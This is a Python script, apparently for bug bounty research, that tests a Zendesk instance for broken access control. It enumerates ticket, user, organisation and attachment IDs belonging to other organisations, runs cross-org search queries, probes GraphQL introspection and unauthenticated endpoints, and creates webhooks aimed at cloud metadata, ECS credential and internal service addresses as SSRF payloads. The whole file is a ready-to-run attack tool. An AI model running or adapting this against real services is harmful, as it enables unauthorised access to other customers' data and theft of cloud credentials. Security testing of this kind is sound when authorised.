#!/usr/bin/env python3
"""
Zendesk IDOR / Broken Access Control Tester
Tests API endpoints for unauthorized access to other orgs' data.

Usage:
    export ZENDESK_SUBDOMAIN="your-sandbox-subdomain"
    export ZENDESK_EMAIL="your-agent@example.com"
    export ZENDESK_API_TOKEN="your_token_here"
    python3 zendesk_idor_test.py

Scope: Zendesk Suite (agent/admin) + Zendesk Front End (end-user)
"""

import os
import sys
import json
import requests
from urllib.parse import urljoin

# --- Config ---
SUBDOMAIN = os.environ.get("ZENDESK_SUBDOMAIN", "")
EMAIL = os.environ.get("ZENDESK_EMAIL", "")
API_TOKEN = os.environ.get("ZENDESK_API_TOKEN", "")

if not all([SUBDOMAIN, EMAIL, API_TOKEN]):
    print("ERROR: Set ZENDESK_SUBDOMAIN, ZENDESK_EMAIL, ZENDESK_API_TOKEN env vars")
    sys.exit(1)

BASE_URL = f"https://{SUBDOMAIN}.zendesk.com"
AUTH = (f"{EMAIL}/token", API_TOKEN)

# --- Helpers ---
def api_get(path, auth=True, params=None):
    """Make authenticated GET request to Zendesk API."""
    url = urljoin(BASE_URL, path)
    try:
        if auth:
            r = requests.get(url, auth=AUTH, params=params, timeout=15)
        else:
            r = requests.get(url, params=params, timeout=15)
        return r
    except requests.RequestException as e:
        print(f"  ERROR: {e}")
        return None

def api_post(path, data, auth=True):
    """Make authenticated POST request."""
    url = urljoin(BASE_URL, path)
    headers = {"Content-Type": "application/json"}
    try:
        if auth:
            r = requests.post(url, auth=AUTH, json=data, headers=headers, timeout=15)
        else:
            r = requests.post(url, json=data, headers=headers, timeout=15)
        return r
    except requests.RequestException as e:
        print(f"  ERROR: {e}")
        return None

def print_result(test_name, response, expected_codes=None):
    """Print test result with clear pass/fail."""
    if response is None:
        print(f"  [{test_name}] SKIP - request failed")
        return

    status = response.status_code
    if expected_codes and status not in expected_codes:
        print(f"  [{test_name}] INTERESTING - Status {status} (expected {expected_codes})")
        try:
            body = response.json()
            # Don't dump huge responses
            summary = json.dumps(body, indent=2)[:500]
            print(f"    Response: {summary}")
        except Exception:
            print(f"    Response: {response.text[:200]}")
    else:
        print(f"  [{test_name}] OK - Status {status}")

# === PHASE 1: Connectivity & Self-Info ===
def test_connectivity():
    print("\n=== PHASE 1: Connectivity ===")
    r = api_get("/api/v2/users/me.json")
    if r and r.status_code == 200:
        user = r.json().get("user", {})
        print(f"  Connected as: {user.get('email')} (ID: {user.get('id')})")
        print(f"  Role: {user.get('role')}")
        print(f"  Org: {user.get('organization_id')}")
        return user
    else:
        print(f"  FAILED to connect! Status: {r.status_code if r else 'N/A'}")
        return None

# === PHASE 2: IDOR on Ticket IDs ===
def test_ticket_idor(my_user_id):
    print("\n=== PHASE 2: Ticket IDOR ===")

    # Create a test ticket first
    ticket_data = {
        "ticket": {
            "subject": "IDOR Test Ticket - Bug Bounty Research",
            "description": "This is a test ticket for security research.",
            "priority": "low"
        }
    }
    r = api_post("/api/v2/tickets.json", ticket_data)
    if r and r.status_code in [200, 201]:
        my_ticket_id = r.json().get("ticket", {}).get("id")
        print(f"  Created test ticket ID: {my_ticket_id}")
    else:
        print(f"  Could not create test ticket: {r.status_code if r else 'N/A'}")
        my_ticket_id = 1

    # Try to access sequential ticket IDs (other orgs)
    test_ids = [1, 2, 3, my_ticket_id - 1 if my_ticket_id > 1 else 100, my_ticket_id + 1]
    for tid in test_ids:
        if tid == my_ticket_id:
            continue
        r = api_get(f"/api/v2/tickets/{tid}.json")
        print_result(f"Ticket #{tid}", r, expected_codes=[404, 403])

# === PHASE 3: IDOR on User IDs ===
def test_user_idor(my_user_id):
    print("\n=== PHASE 3: User IDOR ===")

    # Try to access other user IDs
    test_ids = [1, 2, my_user_id - 1, my_user_id + 1, my_user_id + 100]
    for uid in test_ids:
        if uid == my_user_id or uid <= 0:
            continue
        r = api_get(f"/api/v2/users/{uid}.json")
        print_result(f"User #{uid}", r, expected_codes=[404, 403])

# === PHASE 4: Organization IDOR ===
def test_org_idor():
    print("\n=== PHASE 4: Organization IDOR ===")

    # Get my org first
    r = api_get("/api/v2/organizations.json")
    if r and r.status_code == 200:
        orgs = r.json().get("organizations", [])
        print(f"  My orgs: {[o.get('id') for o in orgs]}")

    # Try other org IDs
    for oid in [1, 2, 3, 100, 1000]:
        r = api_get(f"/api/v2/organizations/{oid}.json")
        print_result(f"Org #{oid}", r, expected_codes=[404, 403])

# === PHASE 5: Attachment Access ===
def test_attachment_access():
    print("\n=== PHASE 5: Attachment Access ===")

    # Try to enumerate attachments
    for aid in [1, 100, 1000, 10000]:
        r = api_get(f"/api/v2/attachments/{aid}.json")
        print_result(f"Attachment #{aid}", r, expected_codes=[404, 403])

# === PHASE 6: Search Endpoint ===
def test_search():
    print("\n=== PHASE 6: Search API ===")

    # Search can sometimes leak cross-org data
    searches = [
        ("type:ticket", "All tickets"),
        ("type:user role:admin", "Admin users"),
        ("type:organization", "All organizations"),
        ("type:ticket status:open", "Open tickets"),
    ]
    for query, label in searches:
        r = api_get("/api/v2/search.json", params={"query": query})
        if r and r.status_code == 200:
            count = r.json().get("count", 0)
            print(f"  [Search: {label}] {count} results")
            if count > 0:
                results = r.json().get("results", [])
                for result in results[:3]:
                    print(f"    - {result.get('result_type')}: ID {result.get('id')} - {result.get('subject', result.get('name', 'N/A'))}")
        else:
            print_result(f"Search: {label}", r, expected_codes=[200])

# === PHASE 7: GraphQL Introspection ===
def test_graphql():
    print("\n=== PHASE 7: GraphQL ===")

    # Check common GraphQL paths
    gql_paths = [
        "/graphql",
        "/api/graphql",
        "/api/v2/graphql",
        "/admin/graphql",
    ]

    introspection_query = {
        "query": "{ __schema { types { name description } } }"
    }

    for path in gql_paths:
        url = f"{BASE_URL}{path}"
        try:
            r = requests.post(url, auth=AUTH, json=introspection_query,
                            headers={"Content-Type": "application/json"}, timeout=15)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if "data" in data and "__schema" in data.get("data", {}):
                        types = data["data"]["__schema"]["types"]
                        print(f"  [GraphQL {path}] INTROSPECTION ENABLED! {len(types)} types found!")
                        print(f"    Types: {[t['name'] for t in types[:10]]}...")
                        # Save full schema
                        with open("recon/zendesk/graphql_schema.json", "w") as f:
                            json.dump(data, f, indent=2)
                        print(f"    Schema saved to recon/zendesk/graphql_schema.json")
                    else:
                        print(f"  [GraphQL {path}] Status 200 but no schema: {json.dumps(data)[:200]}")
                except Exception:
                    print(f"  [GraphQL {path}] Status 200 but not JSON: {r.text[:200]}")
            elif r.status_code in [404, 405]:
                print(f"  [GraphQL {path}] Not found ({r.status_code})")
            else:
                print(f"  [GraphQL {path}] Status {r.status_code}: {r.text[:200]}")
        except requests.RequestException as e:
            print(f"  [GraphQL {path}] Error: {e}")

# === PHASE 8: Unauthenticated Endpoint Discovery ===
def test_unauth_endpoints():
    print("\n=== PHASE 8: Unauthenticated Access ===")

    endpoints = [
        "/api/v2/users.json",
        "/api/v2/tickets.json",
        "/api/v2/organizations.json",
        "/api/v2/groups.json",
        "/api/v2/search.json?query=type:ticket",
        "/api/v2/help_center/articles.json",
        "/api/v2/help_center/categories.json",
        "/api/v2/account/settings.json",
        "/.well-known/openid-configuration",
        "/.well-known/security.txt",
        "/auth/v2/login",
        "/admin/",
    ]

    for ep in endpoints:
        r = api_get(ep, auth=False)
        if r and r.status_code not in [401, 403, 404, 301, 302]:
            print(f"  INTERESTING: {ep} returned {r.status_code}")
            try:
                print(f"    Body: {r.text[:300]}")
            except Exception:
                pass
        elif r:
            print(f"  [{ep}] {r.status_code} (expected)")

# === PHASE 9: SSRF via Webhook ===
def test_webhook_ssrf():
    print("\n=== PHASE 9: Webhook SSRF Test ===")

    # Try to create a webhook pointing to internal IPs
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://127.0.0.1:6379/",  # Redis
        "http://127.0.0.1:9200/",  # Elasticsearch
        "http://169.254.170.2/v2/credentials",  # ECS task role
    ]

    for target in ssrf_targets:
        webhook_data = {
            "webhook": {
                "name": f"Security Test - {target[:30]}",
                "status": "active",
                "endpoint": target,
                "http_method": "GET",
                "request_format": "json",
                "subscriptions": ["conditional_ticket_events"]
            }
        }
        r = api_post("/api/v2/webhooks", webhook_data)
        if r:
            if r.status_code in [200, 201]:
                print(f"  CRITICAL: Webhook created for {target}!")
                webhook_id = r.json().get("webhook", {}).get("id")
                print(f"    Webhook ID: {webhook_id}")
                # Clean up - delete the webhook
                if webhook_id:
                    requests.delete(f"{BASE_URL}/api/v2/webhooks/{webhook_id}", auth=AUTH, timeout=15)
                    print(f"    Cleaned up webhook {webhook_id}")
            elif r.status_code == 422:
                error = r.json() if r.headers.get("content-type", "").startswith("application/json") else r.text[:200]
                print(f"  [{target[:40]}] Blocked (422): {json.dumps(error)[:200] if isinstance(error, dict) else error}")
            else:
                print(f"  [{target[:40]}] Status {r.status_code}")

# === MAIN ===
if __name__ == "__main__":
    print(f"Zendesk IDOR/Access Control Tester")
    print(f"Target: {BASE_URL}")
    print(f"Auth: {EMAIL}")
    print("=" * 60)

    user = test_connectivity()
    if not user:
        print("\nCannot continue without valid auth. Check your credentials.")
        sys.exit(1)

    my_user_id = user.get("id", 0)

    test_ticket_idor(my_user_id)
    test_user_idor(my_user_id)
    test_org_idor()
    test_attachment_access()
    test_search()
    test_graphql()
    test_unauth_endpoints()
    test_webhook_ssrf()

    print("\n" + "=" * 60)
    print("DONE. Review any INTERESTING or CRITICAL findings above.")
    print("Check recon/zendesk/ for any saved data.")
